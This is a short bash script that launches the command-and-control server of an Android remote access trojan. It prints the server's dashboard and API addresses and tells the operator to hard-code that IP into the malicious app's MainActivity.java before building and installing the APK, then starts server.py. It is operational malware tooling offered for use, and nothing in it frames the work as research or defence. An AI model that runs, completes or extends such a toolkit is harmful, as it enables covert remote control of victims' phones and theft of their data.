#!/bin/bash
# Start C2 Server Script

echo "🚀 Starting Android RAT C2 Server..."
echo ""

# Get server IP
SERVER_IP=$(hostname -I | awk '{print $1}')

echo "╔═══════════════════════════════════════════════════════╗"
echo "║          Android RAT - C2 Server                      ║"
echo "╠═══════════════════════════════════════════════════════╣"
echo "║  Server IP:    $SERVER_IP                           ║"
echo "║  Dashboard:    http://$SERVER_IP:5000                ║"
echo "║  API:          http://$SERVER_IP:5000/api            ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo ""
echo "📝 IMPORTANT: Update SERVER_URL in MainActivity.java:"
echo "   $SERVER_IP"
echo ""
echo "📱 After building APK, update this IP before installing!"
echo ""
echo "🌐 Starting server..."
echo ""

# Start server
python3 server.py
